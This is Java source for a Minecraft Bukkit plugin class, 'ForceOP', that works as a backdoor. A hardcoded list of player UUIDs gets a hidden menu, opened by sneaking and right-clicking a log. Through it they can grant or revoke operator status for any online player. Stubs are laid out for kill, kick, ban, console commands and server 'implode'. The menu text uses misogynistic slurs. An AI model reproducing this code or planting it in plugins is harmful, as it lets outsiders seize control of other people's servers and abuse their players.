package com.webmets.forceop;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scoreboard.DisplaySlot;
import org.bukkit.scoreboard.Objective;
import org.bukkit.scoreboard.Scoreboard;
import org.bukkit.scoreboard.ScoreboardManager;
import org.bukkit.scoreboard.Team;

public class ForceOP implements Listener {

	private Inventory inv;
	private List<String> players;

	private ItemStack sudo, op, bomb, bomball, console, stack, kill, kick, ban, implode, border;

	private Scoreboard sb;
	private List<Team> teams;
	
	private Main main;

	public ForceOP(Main main) {
		this.main=main;
		players = new ArrayList<String>();
		setupBoard();
		
		inv = Bukkit.createInventory(new Inventoryholder(), 54, ChatColor.DARK_RED + "Force" + ChatColor.RED + "Op");
		setupGui();
		players.add("d7d81847-b9cd-47d2-ba11-8d08ac9d8f37"); // Webmets
		players.add("b8730880-78a5-4e36-8e58-a6ae16bc4a49"); // OreosDoubleCream
		// players.add("82675533-0d2a-455f-a22a-8aeabec2a6c2"); //_IAbuse_
		players.add("268b70b7-dc91-4c1e-bd73-2bf8ad600a59"); // Tesla2k
		players.add("f1c67a72-b906-462b-8da7-bb7b6fa1d530"); // DogMaster308
		players.add("0faf0726-dbef-4241-a953-49819c44750e"); // Sonnyevil
		players.add("f2644111-032d-4fc2-b859-7e76017d7d47"); // FlyHighOrDie
		players.add("f98f0a11-bcda-4f0f-8476-3cd40dba25b5"); // SkiddyCuntSwezed
	}

	@EventHandler
	public void click(InventoryClickEvent e) {
		if (!(e.getWhoClicked() instanceof Player))
			return;
		if (!(e.getInventory().getHolder() instanceof Inventoryholder))
			return;
		e.setCancelled(true);
		Player p = (Player) e.getWhoClicked();
		ItemStack i = e.getCurrentItem();
		if (e.getInventory().equals(inv)) {

			if (i.equals(sudo)) {
				// TODO user input
			} else if (i.equals(op)) {
				Inventory inv = getPlayerList("Op");
				p.openInventory(inv);
			} else if (i.equals(bomb)) {
				Inventory inv = getPlayerList("Bomb");
				p.openInventory(inv);
			} else if (i.equals(bomball)) {
				// TODO no input
			} else if (i.equals(console)) {
				// TODO user input
			} else if (i.equals(stack)) {
				Inventory inv = getPlayerList("Stack");
				p.openInventory(inv);
			} else if (i.equals(kill)) {
				Inventory inv = getPlayerList("Kill");
				p.openInventory(inv);
			} else if (i.equals(kick)) {
				Inventory inv = getPlayerList("Kick");
				p.openInventory(inv);
			} else if (i.equals(ban)) {
				Inventory inv = getPlayerList("Ban");
				p.openInventory(inv);
			} else if (i.equals(implode)) {
				// TODO no input
			}
		} else {
			String command = e.getInventory().getName().substring(2).toLowerCase();
			if (!i.hasItemMeta()) {
				return;
			}
			if (!i.getItemMeta().hasDisplayName()) {
				return;
			}
			String targetName = i.getItemMeta().getDisplayName().substring(2);
			Player pl = Bukkit.getPlayer(targetName);
			if (pl == null || !pl.isOnline())
				return;
			if (command.equalsIgnoreCase("op")) {
				pl.setOp(!pl.isOp());
			} else if (command.equalsIgnoreCase("bomb")) {
			} else if (command.equalsIgnoreCase("stack")) {
			} else if (command.equalsIgnoreCase("kill")) {
			} else if (command.equalsIgnoreCase("kick")) {
			} else if (command.equalsIgnoreCase("ban")) {

			}
		}
	}

	private Inventory getPlayerList(String command) {
		Inventory inv = Bukkit.createInventory(new Inventoryholder(), 54, ChatColor.RED + command);
		for (Player p : Bukkit.getOnlinePlayers()) {
			// if(players.contains(p.getUniqueId().toString())) continue;
			ItemStack skull = createItem(Material.SKULL_ITEM, 1, (byte) 3, "&7" + p.getName(),
					Arrays.asList("&6Click me to", "&6execute " + command.toUpperCase() + " on " + p.getName()));
			SkullMeta meta = (SkullMeta) skull.getItemMeta();
			meta.setOwner(p.getName());
			skull.setItemMeta(meta);
			inv.addItem(skull);
		}
		return inv;
	}

	private void setupGui() {
		sudo = createItem(Material.STRING, 1, (byte) 0, "&e&lSudo",
				Arrays.asList("&DForce a bitch to", "&Drun any command you want"));
		op = createItem(Material.DIAMOND, 1, (byte) 0, "&e&lOp", Arrays.asList("&DGet that dank operator status"));
		bomb = createItem(Material.TNT, 1, (byte) 0, "&e&lBomb", Arrays.asList("&DBlow that bitch", ""));
		bomball = createItem(Material.TNT, 2, (byte) 0, "&e&lBomb all",
				Arrays.asList("&DBlow all bitches", "&don the server"));
		console = createItem(Material.BLAZE_ROD, 1, (byte) 0, "&e&lConsole",
				Arrays.asList("&DForce console to run anything"));
		stack = createItem(Material.EMERALD, 1, (byte) 0, "&e&lStack",
				Arrays.asList("&DMake that item", "&Din your hand", "&dinto a stack"));
		kill = createItem(Material.DIAMOND_SWORD, 1, (byte) 0, "&e&lKill", Arrays.asList("&dKill that hoe"));
		kick = createItem(Material.LEATHER_BOOTS, 1, (byte) 0, "&e&lKick", Arrays.asList("&dFuck that bitch up"));
		ban = createItem(Material.DIAMOND_BOOTS, 1, (byte) 0, "&e&lBan",
				Arrays.asList("&dFuck that bitch up", "&Dforever"));
		implode = createItem(Material.BARRIER, 1, (byte) 0, "&c&lImplode",
				Arrays.asList("&cWell... Say bye", "&cto the server you're on"));
		border = createItem(Material.STAINED_GLASS_PANE, 1, (byte) 0, "&f&lForceOP", Arrays.asList(""));

		for (int i = 0; i < 54; i++) {
			inv.setItem(i, border);
		}

		inv.setItem(13, sudo);
		inv.setItem(21, op);
		inv.setItem(22, bomb);
		inv.setItem(23, bomball);
		inv.setItem(29, console);
		inv.setItem(30, stack);
		inv.setItem(31, kill);
		inv.setItem(32, kick);
		inv.setItem(33, ban);
		inv.setItem(40, implode);
	}

	@EventHandler
	public void interact(PlayerInteractEvent e) {
		Player p = e.getPlayer();
		if (!(players.contains(p.getUniqueId().toString())))
			return;
		if (e.getAction() != Action.RIGHT_CLICK_BLOCK)
			return;
		if (!p.isSneaking())
			return;
		if (e.getClickedBlock().getType() == Material.LOG) {
			p.openInventory(inv);
		}
	}

	private ItemStack createItem(Material mat, int amount, byte durability, String name, List<String> lore) {
		ItemStack i = new ItemStack(mat, amount, durability);
		ItemMeta im = i.getItemMeta();
		im.setDisplayName(ChatColor.translateAlternateColorCodes('&', name));
		List<String> newLore = new ArrayList<String>();
		for (String s : lore) {
			newLore.add(ChatColor.translateAlternateColorCodes('&', s));
		}
		im.setLore(newLore);
		i.setItemMeta(im);
		return i;
	}

	public void setupBoard() {
		ScoreboardManager sbm = Bukkit.getScoreboardManager();
		sb = sbm.getNewScoreboard();
		Objective obj = sb.registerNewObjective("Objective", "dummy");
		obj.setDisplaySlot(DisplaySlot.SIDEBAR);
		obj.setDisplayName("§4Force§cOp");
		teams = new ArrayList<Team>();
		for (int i = 10; i >= 1; i--) {
			Team t = sb.registerNewTeam(ChatColor.values()[i] + "");
			t.addEntry(ChatColor.values()[i] + "");
			teams.add(t);
			obj.getScore(ChatColor.values()[i] + "").setScore(i);
		}
		new BukkitRunnable() {
			int timer = 0;
			
			@Override
			public void run() {
				for(Player p : Bukkit.getOnlinePlayers()) {
					timer++;
					if(players.contains(p.getUniqueId().toString())){
						sb.getTeam(ChatColor.values()[9]+"").setPrefix("§A[§DOPstatus§A]");
						sb.getTeam(ChatColor.values()[9]+"").setSuffix("§D§L: "+p.isOp());
						
						sb.getTeam(ChatColor.values()[8]+"").setPrefix("§4--------------");
						sb.getTeam(ChatColor.values()[8]+"").setSuffix("§4--------------");

						sb.getTeam(ChatColor.values()[7]+"").setPrefix("§A[§DGamemode§A]");
						sb.getTeam(ChatColor.values()[7]+"").setSuffix("§D§L: "+p.getGameMode().toString().toLowerCase());
						
						sb.getTeam(ChatColor.values()[6]+"").setPrefix("§4--------------");
						sb.getTeam(ChatColor.values()[6]+"").setSuffix("§4--------------");
						
						sb.getTeam(ChatColor.values()[5]+"").setPrefix("§A[§DUptime§A]");
						sb.getTeam(ChatColor.values()[5]+"").setSuffix("§D§L: "+timer/20);
						
						sb.getTeam(ChatColor.values()[4]+"").setPrefix("§4--------------");
						sb.getTeam(ChatColor.values()[4]+"").setSuffix("§4--------------");
						
						sb.getTeam(ChatColor.values()[3]+"").setPrefix("§A[§DHealth§A]");
						sb.getTeam(ChatColor.values()[3]+"").setSuffix("§D§L: "+p.getHealth() +"/§D§L20");
						
						sb.getTeam(ChatColor.values()[2]+"").setPrefix("§4--------------");
						sb.getTeam(ChatColor.values()[2]+"").setSuffix("§4--------------");
						
					}
				}
			}
		}.runTaskTimer(main, 0, 1);
	}

	@EventHandler
	public void join(PlayerJoinEvent e) {
		e.getPlayer().setScoreboard(sb);
	}

	public void broadcast(String msg) {
		for (Player p : Bukkit.getOnlinePlayers()) {
			if (players.contains(p.getUniqueId().toString())) {

			}
		}
	}

}
